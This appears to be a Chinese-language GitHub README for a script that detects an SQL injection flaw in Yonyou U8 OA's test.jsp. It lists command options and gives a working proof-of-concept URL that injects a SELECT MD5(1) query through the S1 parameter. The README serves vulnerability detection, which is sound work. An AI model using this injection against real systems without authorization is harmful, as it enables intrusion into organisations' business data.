# U8detectPoc_Sql

对于用友 U8 OA test.jsp文件存在 SQL注入漏洞,进行脚本化检测POC


![54a0f28294bd422fa6a3db0f8e1b58b](https://user-images.githubusercontent.com/103556327/192998813-de8a659b-732e-4019-9dd5-ea47adff1010.jpg)

```
-h / --help使用帮助参数
```


![image](https://user-images.githubusercontent.com/103556327/192997926-5757abd1-4dd2-41ed-9c50-47d069f281fd.png)

```
-u 输入url网站地址直接进行检测是否存在漏洞
```

# poc:

```
http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
```
![4e950ce3adb881a6d25cb46f3decaa4](https://user-images.githubusercontent.com/103556327/192998187-93f2f586-e153-4235-a13f-2f4d39427df0.jpg)


### via:PeiQi
